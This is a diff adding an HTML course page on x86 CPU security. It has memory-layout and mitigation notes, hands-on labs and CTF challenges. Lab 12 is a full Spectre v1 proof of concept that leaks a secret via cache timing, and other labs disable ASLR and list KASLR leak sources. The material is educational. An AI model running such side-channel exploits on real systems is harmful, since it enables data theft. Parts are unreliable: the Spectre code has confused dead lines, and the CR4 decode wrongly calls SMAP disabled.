+  R9  = arg6                 RAX = return value</code></pre>
+
+      <!-- ==================== MEMORY LAYOUT ==================== -->
+      <h2>Virtual Address Space Layout</h2>
+
+      <h3>x86-64 Canonical Addresses</h3>
+      <pre><code class="language-none">User space:    0x0000000000000000 — 0x00007FFFFFFFFFFF  (128 TB)
+  ├─ .text        (executable code)
+  ├─ .data/.bss   (initialized/uninitialized data)
+  ├─ Heap         (grows ↑, brk/mmap)
+  ├─ Shared libs  (mmap region)
+  ├─ Stack        (grows ↓, per-thread)
+  ├─ [vvar]       (kernel-mapped read-only data, e.g. clock)
+  └─ [vdso]       (virtual dynamic shared object, fast syscalls)
+
+--- Non-canonical hole: 0x0000800000000000 — 0xFFFF7FFFFFFFFFFF ---
+
+Kernel space:  0xFFFF800000000000 — 0xFFFFFFFFFFFFFFFF  (128 TB)
+  ├─ Direct map   (physmap: all physical RAM mapped linearly)
+  ├─ vmalloc      (non-contiguous kernel allocations)
+  ├─ vmemmap      (struct page array)
+  ├─ Kernel text  (__start_rodata → _etext)
+  ├─ Modules      (loadable kernel modules)
+  └─ Fix-mapped   (compile-time known virtual addresses)
+
+Windows kernel:
+  0xFFFF800000000000+  Large/huge pages (Session space, paged/nonpaged pool)
+  0xFFFFF80000000000+  ntoskrnl.exe, HAL, drivers</code></pre>
+
+      <h3>ASLR</h3>
+      <table>
+        <tr><th>Region</th><th>Linux Entropy</th><th>Windows Entropy</th></tr>
+        <tr><td>Executable base</td><td>28 bits (PIE)</td><td>17-19 bits (High Entropy ASLR)</td></tr>
+        <tr><td>Stack</td><td>22 bits</td><td>17 bits</td></tr>
+        <tr><td>mmap/Heap</td><td>28 bits</td><td>17-24 bits</td></tr>
+        <tr><td>Kernel (KASLR)</td><td>9-12 bits</td><td>~24 bits</td></tr>
+      </table>
+      <p><strong>KASLR bypass</strong>: info leaks via <code>/proc/kallsyms</code> (CAP_SYSLOG), dmesg (kptr_restrict), <code>NtQuerySystemInformation</code> (Windows), prefetch timing side-channels, EntryBleed (CVE-2022-4543).</p>
+
+      <!-- ==================== KPTI ==================== -->
+      <h2>KPTI (Kernel Page Table Isolation)</h2>
+      <p>Mitigation for Meltdown (CVE-2017-5754). Maintains <strong>two sets of page tables</strong> per process:</p>
+      <ul>
+        <li><strong>Kernel page tables</strong>: map both user and kernel space (used in Ring 0)</li>
+        <li><strong>User page tables</strong>: map user space + minimal kernel entry stub (used in Ring 3)</li>
+      </ul>
+      <p>On every syscall/interrupt, CR3 is switched between the two. PCID avoids full TLB flush. Performance cost: ~2-5% for syscall-heavy workloads.</p>
+      <pre><code class="language-bash"># Check KPTI status
+cat /sys/devices/system/cpu/vulnerabilities/meltdown
+# "Mitigation: PTI" = active
+
+# Check from kernel cmdline
+cat /proc/cmdline | grep -o 'pti=[a-z]*'</code></pre>
+
+      </div>
+
+      <!-- LAB TAB -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <div class="lab-card">
+          <h4>Lab 1: CPUID Enumeration &amp; Processor Identification</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Write a program to enumerate CPUID information and identify your processor's family, model, stepping, and feature flags.</p>
+          <div class="setup-code">
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void cpuid(int eax, int ecx, int *a, int *b, int *c, int *d) {
+    asm volatile(
+        "cpuid"
+        : "=a" (*a), "=b" (*b), "=c" (*c), "=d" (*d)
+        : "0" (eax), "2" (ecx)
+    );
+}
+
+int main() {
+    int eax, ebx, ecx, edx;
+    
+    // Get max CPUID level &amp; vendor string
+    cpuid(0, 0, &amp;eax, &amp;ebx, &amp;ecx, &amp;edx);
+    printf("CPUID max: 0x%x\n", eax);
+    printf("Vendor: %.4s%.4s%.4s\n", (char*)&amp;ebx, (char*)&amp;edx, (char*)&amp;ecx);
+    
+    // Get version info
+    cpuid(1, 0, &amp;eax, &amp;ebx, &amp;ecx, &amp;edx);
+    printf("Version: 0x%x\n", eax);
+    printf("Stepping: %d, Model: %d, Family: %d\n",
+        eax &amp; 0xf, (eax >> 4) &amp; 0xf, (eax >> 8) &amp; 0xf);
+    
+    // Decode feature flags
+    printf("SSE3: %d, AVX: %d, AES-NI: %d\n",
+        ecx &amp; 1, (ecx >> 28) &amp; 1, (ecx >> 25) &amp; 1);
+    
+    // Check extended features (CPUID.7.0)
+    cpuid(7, 0, &amp;eax, &amp;ebx, &amp;ecx, &amp;edx);
+    printf("SMEP: %d, SMAP: %d\n", (ebx >> 7) &amp; 1, (ebx >> 20) &amp; 1);
+    
+    return 0;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Compile and run on your system. Use the interactive decoder on this page to verify the family/model/stepping match your processor codename.</li>
+              <li>Decode ECX and EDX feature flags from CPUID.1 — identify SSE, AVX, AES-NI, and hypervisor presence (ECX bit 31).</li>
+              <li>Check CPUID.7.0.EBX for SMEP (bit 7) and SMAP (bit 20). These are critical kernel mitigations.</li>
+              <li>Compare your results with <code>/proc/cpuinfo</code> (Linux) or <code>Get-CimInstance Win32_Processor</code> (Windows) and verify they match.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: Privilege Level Detection</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Read the CS register to determine the Current Privilege Level (CPL) and understand the Ring 0 vs Ring 3 boundary.</p>
+          <div class="setup-code">
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+unsigned short get_cs() {
+    unsigned short cs;
+    asm volatile("mov %%cs, %0" : "=r" (cs));
+    return cs;
+}
+
+int main() {
+    unsigned short cs = get_cs();
+    int cpl = cs &amp; 3;  // Lower 2 bits = CPL
+    printf("CS: 0x%04x, CPL: %d (%s)\n", cs, cpl, 
+        cpl == 0 ? "Kernel" : "User");
+    
+    // Try to read CR0 — will fault in user mode
+    // unsigned long cr0;
+    // asm volatile("mov %%cr0, %0" : "=r" (cr0));  // → SIGILL / #GP
+    
+    return 0;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run the program and verify CPL = 3 (Ring 3, user mode).</li>
+              <li>Uncomment the CR0 read line — observe the segfault/illegal instruction. Explain why privileged register access is restricted.</li>
+              <li>Write a Linux kernel module that reads CS from kernel context — verify CPL = 0.</li>
+              <li>On Windows, use WinDbg <code>r cs</code> in kernel debug mode to check CS value in kernel context.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: Virtual-to-Physical Address Translation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Walk your own page tables using /proc/self/pagemap to translate virtual addresses to physical addresses and observe ASLR randomization.</p>
+          <div class="setup-code">
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdint.h&gt;
+
+uint64_t virt_to_phys(pid_t pid, uint64_t vaddr) {
+    char path[64];
+    snprintf(path, sizeof(path), "/proc/%d/pagemap", pid);
+    int fd = open(path, O_RDONLY);
+    if (fd < 0) { perror("open pagemap (need root)"); return 0; }
+    
+    uint64_t page_no = vaddr / 4096;
+    uint64_t entry;
+    lseek(fd, page_no * 8, SEEK_SET);
+    read(fd, &amp;entry, 8);
+    close(fd);
+    
+    if (!(entry &amp; (1ULL << 63))) {
+        printf("Page not present!\n");
+        return 0;
+    }
+    
+    uint64_t pfn = entry &amp; 0x7FFFFFFFFFFFFF;
+    return pfn * 4096 + (vaddr &amp; 0xfff);
+}
+
+int global_var = 42;
+
+int main() {
+    int stack_var = 99;
+    void *heap_var = malloc(64);
+    
+    printf("Segment          Virtual              Physical\n");
+    printf(".text (main)     %p  0x%lx\n",
+        (void*)main, virt_to_phys(getpid(), (uint64_t)main));
+    printf(".data (global)   %p  0x%lx\n",
+        &amp;global_var, virt_to_phys(getpid(), (uint64_t)&amp;global_var));
+    printf("stack            %p  0x%lx\n",
+        &amp;stack_var, virt_to_phys(getpid(), (uint64_t)&amp;stack_var));
+    printf("heap             %p  0x%lx\n",
+        heap_var, virt_to_phys(getpid(), (uint64_t)heap_var));
+    
+    free(heap_var);
+    return 0;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Compile and run as root. Verify each segment maps to a different physical address range.</li>
+              <li>Run the program 5 times — observe how virtual addresses change each time (ASLR). Do physical addresses also change?</li>
+              <li>Check <code>/proc/self/maps</code> and verify that .text is <code>r-xp</code> (read+execute) and .data is <code>rw-p</code> (read+write). What does the <code>p</code> mean?</li>
+              <li><strong>Bonus:</strong> Write a kernel module that walks PML4 → PDPT → PD → PT manually given a CR3 value to translate the same addresses.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: Control Register Inspection</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Write a kernel module to read CR0, CR3, CR4 and decode the security-relevant flags (paging, write-protect, SMEP, SMAP).</p>
+          <div class="setup-code">
+<pre><code class="language-c">// cr_inspect.c — Linux kernel module
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/module.h&gt;
+#include &lt;linux/init.h&gt;
+
+MODULE_LICENSE("GPL");
+
+static int __init cr_inspect_init(void) {
+    unsigned long cr0, cr3, cr4;
+    
+    asm volatile("mov %%cr0, %0" : "=r" (cr0));
+    asm volatile("mov %%cr3, %0" : "=r" (cr3));
+    asm volatile("mov %%cr4, %0" : "=r" (cr4));
+    
+    printk(KERN_INFO "=== Control Register Dump ===");
+    printk(KERN_INFO "CR0: 0x%016lx", cr0);
+    printk(KERN_INFO "  PG (Paging):         %lu", (cr0 >> 31) &amp; 1);
+    printk(KERN_INFO "  WP (Write Protect):  %lu", (cr0 >> 16) &amp; 1);
+    printk(KERN_INFO "  NE (Numeric Error):  %lu", (cr0 >> 5) &amp; 1);
+    printk(KERN_INFO "  PE (Protected Mode): %lu", cr0 &amp; 1);
+    printk(KERN_INFO "CR3: 0x%016lx (PML4 phys base: 0x%lx)", cr3, cr3 &amp; ~0xfffUL);
+    printk(KERN_INFO "CR4: 0x%016lx", cr4);
+    printk(KERN_INFO "  SMEP:  %lu", (cr4 >> 20) &amp; 1);
+    printk(KERN_INFO "  SMAP:  %lu", (cr4 >> 21) &amp; 1);
+    printk(KERN_INFO "  UMIP:  %lu", (cr4 >> 11) &amp; 1);
+    printk(KERN_INFO "  PCIDE: %lu", (cr4 >> 17) &amp; 1);
+    printk(KERN_INFO "  PKE:   %lu", (cr4 >> 22) &amp; 1);
+    return 0;
+}
+
+static void __exit cr_inspect_exit(void) {
+    printk(KERN_INFO "cr_inspect unloaded");
+}
+
+module_init(cr_inspect_init);
+module_exit(cr_inspect_exit);</code></pre>
+<pre><code class="language-bash"># Makefile
+obj-m += cr_inspect.o
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+
+# Build and load
+make
+sudo insmod cr_inspect.ko
+dmesg | tail -20
+sudo rmmod cr_inspect</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Build and load the module. Verify CR0.PG=1 (paging enabled), CR0.WP=1 (write-protect active).</li>
+              <li>Check CR4 for SMEP and SMAP — these prevent kernel code from executing/accessing user-mode pages. If either is 0, explain why (VM? old CPU?).</li>
+              <li>Check PCIDE (Process-Context Identifiers) — used for TLB efficiency with KPTI. Is it enabled on your system?</li>
+              <li>Compare the CR3 value with <code>/proc/self/pagemap</code> root — they should agree on the physical page table base.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: GDT and IDT Inspection</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Examine the Global Descriptor Table and Interrupt Descriptor Table to understand how the CPU manages segment permissions and interrupt routing.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Read GDT and IDT base/limit from user mode (may fault with UMIP)
+#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+
+struct descriptor_ptr {
+    uint16_t limit;
+    uint64_t base;
+} __attribute__((packed));
+
+int main() {
+    struct descriptor_ptr gdtr, idtr;
+    
+    asm volatile("sgdt %0" : "=m"(gdtr));
+    asm volatile("sidt %0" : "=m"(idtr));
+    
+    printf("GDT Base: 0x%lx, Limit: 0x%x\n", gdtr.base, gdtr.limit);
+    printf("IDT Base: 0x%lx, Limit: 0x%x\n", idtr.base, idtr.limit);
+    printf("GDT entries: %d\n", (gdtr.limit + 1) / 8);
+    printf("IDT entries: %d\n", (idtr.limit + 1) / 16);
+    
+    return 0;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run the program. If UMIP (User-Mode Instruction Prevention, CR4 bit 11) is enabled, sgdt/sidt will fault — explain why this is a security feature.</li>
+              <li>Write a kernel module to dump GDT entries. Identify the kernel CS (0x10), kernel DS (0x18), user CS (0x33), user DS (0x2B) segments.</li>
+              <li>Dump the first 32 IDT entries from a kernel module. Identify handlers for #DE (0), #DB (1), #NMI (2), #BP (3), #PF (14), and syscall (0x80 on 32-bit).</li>
+              <li>On Windows with WinDbg: use <code>!idt</code> and <code>dg 0 3f</code> to examine both tables.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: MSR (Model-Specific Register) Exploration</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Read security-critical MSRs to understand how the CPU configures syscall entry points, EFER features, and speculative execution mitigations.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Kernel module to read critical MSRs
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/module.h&gt;
+
+MODULE_LICENSE("GPL");
+
+static int __init msr_init(void) {
+    unsigned long long val;
+    
+    rdmsrl(0xC0000080, val);  // IA32_EFER
+    printk(KERN_INFO "IA32_EFER: 0x%llx (SCE=%lld, LME=%lld, NXE=%lld)",
+        val, val &amp; 1, (val >> 8) &amp; 1, (val >> 11) &amp; 1);
+    
+    rdmsrl(0xC0000081, val);  // IA32_STAR
+    printk(KERN_INFO "IA32_STAR: 0x%llx (kernel CS: 0x%llx, user CS: 0x%llx)",
+        val, (val >> 32) &amp; 0xFFFF, (val >> 48) &amp; 0xFFFF);
+    
+    rdmsrl(0xC0000082, val);  // IA32_LSTAR
+    printk(KERN_INFO "IA32_LSTAR: 0x%llx (syscall entry point)", val);
+    
+    rdmsrl(0xC0000084, val);  // IA32_FMASK
+    printk(KERN_INFO "IA32_FMASK: 0x%llx (RFLAGS mask on syscall)", val);
+    
+    rdmsrl(0x48, val);  // IA32_SPEC_CTRL (if available)
+    printk(KERN_INFO "IA32_SPEC_CTRL: 0x%llx (IBRS=%lld, STIBP=%lld, SSBD=%lld)",
+        val, val &amp; 1, (val >> 1) &amp; 1, (val >> 2) &amp; 1);
+    
+    return 0;
+}
+module_init(msr_init);</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Read IA32_EFER. Verify NXE=1 (NX/XD bit enabled). What happens if you clear it?</li>
+              <li>Read IA32_LSTAR — this is the kernel's syscall entry point. On Linux, it points to <code>entry_SYSCALL_64</code>. On Windows, <code>KiSystemCall64</code>.</li>
+              <li>Read IA32_STAR and decode the kernel/user CS selectors. Verify they match your GDT analysis from Lab 5.</li>
+              <li>Check IA32_SPEC_CTRL for Spectre mitigations (IBRS, STIBP, SSBD). Are they active?</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: TLB and Cache Behavior</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Measure memory access timing to understand TLB hits/misses and cache line effects — the foundation of side-channel attacks.</p>
+          <div class="setup-code">
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;x86intrin.h&gt;
+
+#define PAGE_SIZE 4096
+#define NUM_PAGES 256
+
+uint8_t probe_array[NUM_PAGES * PAGE_SIZE];
+
+void flush_all() {
+    for (int i = 0; i &lt; NUM_PAGES; i++)
+        _mm_clflush(&amp;probe_array[i * PAGE_SIZE]);
+}
+
+uint64_t time_access(volatile uint8_t *addr) {
+    uint64_t start = __rdtsc();
+    (void)*addr;  // access
+    return __rdtsc() - start;
+}
+
+int main() {
+    // Warm up one page
+    probe_array[42 * PAGE_SIZE] = 1;
+    
+    // Flush everything
+    flush_all();
+    _mm_mfence();
+    
+    // Re-access the warm page
+    probe_array[42 * PAGE_SIZE] = 1;
+    _mm_mfence();
+    
+    // Time each page access
+    for (int i = 0; i &lt; NUM_PAGES; i++) {
+        uint64_t t = time_access(&amp;probe_array[i * PAGE_SIZE]);
+        if (t &lt; 100)  // cache hit threshold
+            printf("Page %d: %lu cycles (CACHE HIT)\n", i, t);
+    }
+    return 0;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run the program and identify the cache hit (page 42 should be fast, ~30-50 cycles). Other pages should be ~200-300 cycles.</li>
+              <li>Modify to warm up multiple pages and verify you can detect exactly which ones are cached.</li>
+              <li>Measure the difference between L1 hit, L2 hit, L3 hit, and DRAM access. Typical: L1 ~4 cycles, L2 ~12, L3 ~40, DRAM ~200+.</li>
+              <li>This is the core primitive behind Flush+Reload, Meltdown, and Spectre. Explain how an attacker uses this to leak secrets.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: ASLR Entropy Measurement</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Measure ASLR entropy for stack, heap, shared libraries, and executable base by collecting addresses across multiple runs.</p>
+          <div class="setup-code">
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int global_var = 0;
+
+int main() {
+    int stack_var = 0;
+    void *heap_ptr = malloc(64);
+    
+    printf("text:  %p\n", (void*)main);
+    printf("data:  %p\n", &amp;global_var);
+    printf("stack: %p\n", &amp;stack_var);
+    printf("heap:  %p\n", heap_ptr);
+    printf("libc:  %p\n", (void*)printf);
+    
+    free(heap_ptr);
+    return 0;
+}</code></pre>
+<pre><code class="language-bash"># Collect 100 samples and measure entropy
+for i in $(seq 1 100); do ./aslr_test; done | sort | uniq -c | sort -rn
+
+# Check ASLR setting
+cat /proc/sys/kernel/randomize_va_space
+# 0 = disabled, 1 = partial, 2 = full
+
+# Disable for comparison
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+./aslr_test; ./aslr_test  # addresses should be identical</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run the program 20 times. Record how many unique addresses you see for each segment. Which has the most entropy?</li>
+              <li>Compile with <code>-no-pie</code> and repeat. What happens to the text/data addresses?</li>
+              <li>Disable ASLR (<code>randomize_va_space=0</code>), run twice, and verify addresses are identical. Re-enable ASLR after.</li>
+              <li>On x86-64 Linux, stack typically has 22 bits of entropy (8 MB region). How many guesses would a brute-force ASLR bypass need?</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: System Call Tracing</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Trace system calls made by a program to understand the user-kernel boundary and syscall conventions.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Linux: strace
+strace -c ls                    # Summary of syscalls
+strace -e trace=open,read,write ls  # Filter specific syscalls
+strace -f -p $(pgrep firefox)   # Trace running process + children
+
+# Detailed with timestamps
+strace -T -e trace=file ls 2>&amp;1 | head -20
+
+# Count unique syscalls
+strace -c -S calls ls 2>&amp;1
+
+# Write custom program that makes a raw syscall
+# (bypassing libc wrapper)</code></pre>
+<pre><code class="language-c">// Direct syscall without libc wrapper (Linux x86-64)
+#include &lt;stdio.h&gt;
+
+long raw_write(int fd, const void *buf, long count) {
+    long ret;
+    asm volatile(
+        "syscall"
+        : "=a" (ret)
+        : "a" (1),        // syscall number: write = 1
+          "D" (fd),       // rdi = fd
+          "S" (buf),      // rsi = buf
+          "d" (count)     // rdx = count
+        : "rcx", "r11", "memory"  // clobbered by syscall
+    );
+    return ret;
+}
+
+int main() {
+    raw_write(1, "Hello via raw syscall!\n", 23);
+    return 0;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run <code>strace -c ls</code> and identify the top 5 most-called syscalls. What does each do?</li>
+              <li>Compile and run the raw syscall program. Verify with strace that it makes a <code>write(1, ...)</code> call.</li>
+              <li>Trace <code>cat /etc/passwd</code> — identify the <code>openat</code>, <code>read</code>, <code>write</code>, <code>close</code> sequence. What are the file descriptors?</li>
+              <li>Compare: <code>strace ./program</code> vs <code>ltrace ./program</code>. Strace shows kernel boundary; ltrace shows library calls.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: Interrupt and Exception Handling</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Trigger and handle CPU exceptions to understand how the OS dispatches interrupts through the IDT.</p>
+          <div class="setup-code">
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;setjmp.h&gt;
+
+static jmp_buf jump_buffer;
+
+void segfault_handler(int sig) {
+    printf("[!] Caught signal %d (SIGSEGV) \u2014 Page Fault (#PF, IDT vector 14)\n", sig);
+    longjmp(jump_buffer, 1);
+}
+
+void sigfpe_handler(int sig) {
+    printf("[!] Caught signal %d (SIGFPE) \u2014 Divide Error (#DE, IDT vector 0)\n", sig);
+    longjmp(jump_buffer, 2);
+}
+
+int main() {
+    signal(SIGSEGV, segfault_handler);
+    signal(SIGFPE, sigfpe_handler);
+    
+    // Trigger #PF (Page Fault)
+    if (setjmp(jump_buffer) == 0) {
+        printf("[*] Triggering page fault...\n");
+        volatile int *p = (int*)0xDEAD;  // unmapped address
+        *p = 42;
+    }
+    
+    // Trigger #DE (Divide by Zero)
+    if (setjmp(jump_buffer) == 0) {
+        printf("[*] Triggering divide-by-zero...\n");
+        volatile int a = 1, b = 0;
+        volatile int c = a / b;
+        (void)c;
+    }
+    
+    printf("[+] Survived both exceptions via signal handlers.\n");
+    return 0;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run the program. Observe both exceptions are caught and handled. The kernel dispatches #PF (vector 14) as SIGSEGV and #DE (vector 0) as SIGFPE.</li>
+              <li>Use <code>dmesg</code> to check if the kernel logged the faults.</li>
+              <li>Add a handler for SIGILL (Illegal Instruction, #UD vector 6) — trigger it by executing <code>ud2</code> inline assembly.</li>
+              <li>On Windows, the equivalent mechanism is SEH (Structured Exception Handling). Write a <code>__try/__except</code> block that catches an access violation.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: Task State Segment (TSS) Examination</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Examine the TSS to understand how the CPU switches stacks on privilege level changes (Ring 3 → Ring 0).</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Kernel module to dump TSS fields
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/module.h&gt;
+#include &lt;asm/processor.h&gt;
+#include &lt;asm/desc.h&gt;
+
+MODULE_LICENSE("GPL");
+
+static int __init tss_dump_init(void) {
+    struct tss_struct *tss = this_cpu_ptr(&amp;cpu_tss_rw);
+    
+    printk(KERN_INFO "=== TSS Dump (CPU %d) ===", smp_processor_id());
+    printk(KERN_INFO "RSP0 (kernel stack): 0x%lx", tss->x86_tss.sp0);
+    printk(KERN_INFO "RSP1: 0x%lx", tss->x86_tss.sp1);
+    printk(KERN_INFO "RSP2: 0x%lx", tss->x86_tss.sp2);
+    printk(KERN_INFO "IST1: 0x%lx", tss->x86_tss.ist[0]);
+    printk(KERN_INFO "IST2: 0x%lx", tss->x86_tss.ist[1]);
+    printk(KERN_INFO "IST3: 0x%lx", tss->x86_tss.ist[2]);
+    printk(KERN_INFO "IO Map Base: 0x%x", tss->x86_tss.io_bitmap_base);
+    
+    return 0;
+}
+module_init(tss_dump_init);</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Load the module and examine RSP0 — this is the kernel stack pointer loaded when the CPU transitions from Ring 3 to Ring 0 on syscall/interrupt.</li>
+              <li>Identify the IST (Interrupt Stack Table) entries. IST1 is typically used for #DF (Double Fault), IST2 for NMI, IST3 for #MC. Why do these need separate stacks?</li>
+              <li>On Windows in WinDbg: <code>!tss</code> or <code>dt nt!_KTSS64 @$tss</code> to examine the same structure.</li>
+              <li>Explain: when a syscall fires, the CPU reads RSP0 from the TSS to set up the kernel stack. What would happen if an attacker could overwrite RSP0?</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: Spectre v1 Bounds Check Bypass PoC</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Implement a minimal Spectre v1 proof-of-concept to understand how speculative execution can bypass bounds checks and leak data through cache timing.</p>
+          <div class="setup-code">
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;x86intrin.h&gt;
+#include &lt;string.h&gt;
+
+#define CACHE_HIT_THRESHOLD 80
+uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
+uint8_t array2[256 * 512];  // probe array (stride 512 to avoid prefetch)
+uint8_t secret[] = "SECRET_FLAG_DATA";
+unsigned int array1_size = 16;
+
+uint8_t temp = 0;
+
+void victim_function(size_t x) {
+    if (x &lt; array1_size) {        // bounds check (branch predictor will mispredict)
+        temp &amp;= array2[array1[x] * 512];  // speculative out-of-bounds access
+    }
+}
+
+int main() {
+    // The secret is at a known offset from array1
+    size_t malicious_x = (size_t)(secret - (char*)array1);
+    int results[256] = {0};
+    
+    for (int tries = 0; tries &lt; 1000; tries++) {
+        // Flush array2 from cache
+        for (int i = 0; i &lt; 256; i++)
+            _mm_clflush(&amp;array2[i * 512]);
+        
+        // Train branch predictor with valid indices, then attack
+        for (int j = 29; j >= 0; j--) {
+            _mm_clflush(&amp;array1_size);  // flush bounds variable
+            _mm_mfence();
+            size_t x = ((j % 6) - 1) &amp; ~0xFFFF;  // 0 for training, large for attack
+            x = (x | (x >> 16));  // set to malicious_x on attack iterations
+            victim_function(j % 6 ? (j % 6) - 1 : malicious_x);
+        }
+        
+        // Time each probe array page
+        for (int i = 0; i &lt; 256; i++) {
+            uint64_t t = __rdtsc();
+            temp &amp;= array2[i * 512];
+            uint64_t dt = __rdtsc() - t;
+            if (dt &lt;= CACHE_HIT_THRESHOLD &amp;&amp; i != array1[0])
+                results[i]++;
+        }
+    }
+    
+    // Find the byte with most cache hits
+    int best = 0;
+    for (int i = 1; i &lt; 256; i++)
+        if (results[i] > results[best]) best = i;
+    
+    printf("Leaked byte: 0x%02x = '%c'\n", best, best);
+    return 0;
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Compile with <code>gcc -O0 -march=native</code> (no optimization to preserve the branch). Run and verify it leaks the first byte of <code>secret</code>.</li>
+              <li>Modify to leak multiple bytes of the secret string.</li>
+              <li>Try compiling with <code>-O2</code> — does the compiler optimize away the vulnerability? What about <code>-mspeculative-load-hardening</code>?</li>
+              <li>Check <code>/proc/cpuinfo</code> flags for <code>spec_ctrl</code> and <code>ssbd</code>. Are Spectre mitigations enabled on your kernel?</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+
+      <!-- CTF TAB -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <div class="ctf-card">
+          <h4>Challenge 1: Decode the CPUID</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">You intercepted a CPUID value from a target machine: <code>EAX=0x000906A4</code> after <code>CPUID.EAX=1</code>. Identify the processor's microarchitecture, codename, and year of release. Flag format: <code>FLAG{uarch_codename_year}</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Given: CPUID.1:EAX = 0x000906A4
+// Decode:
+//   Extended Family = (EAX >> 20) &amp; 0xFF = 0x00
+//   Extended Model  = (EAX >> 16) &amp; 0xF  = 0x09
+//   Family          = (EAX >> 8)  &amp; 0xF  = 0x06
+//   Model           = (EAX >> 4)  &amp; 0xF  = 0x0A
+//   Stepping        = EAX &amp; 0xF          = 0x4
+//
+// Display Family = Family + Extended Family = 0x06
+// Display Model  = (Extended Model &lt;&lt; 4) + Model = 0x9A
+//
+// Look up Family 6, Model 0x9A — what Intel architecture is this?</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Family 6, Display Model 0x9A = Alder Lake (12th Gen). The hybrid architecture with P-cores (Golden Cove) and E-cores (Gracemont). Released 2021. Use the CPUID decoder tool on this page to verify: enter <code>0x000906A4</code> and check the result.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: Spot the Missing Mitigation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Given a CR4 register dump <code>CR4=0x003506F8</code>, determine which critical kernel mitigations are enabled and which one is suspiciously disabled. Flag format: <code>FLAG{missing_mitigation}</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// CR4 = 0x003506F8 = 0b 0000 0000 0011 0101 0000 0110 1111 1000
+//
+// Decode each bit:
+//   Bit 20 (SMEP):   (0x003506F8 >> 20) &amp; 1 = 1  ✓ Enabled
+//   Bit 21 (SMAP):   (0x003506F8 >> 21) &amp; 1 = 0  ✗ DISABLED!
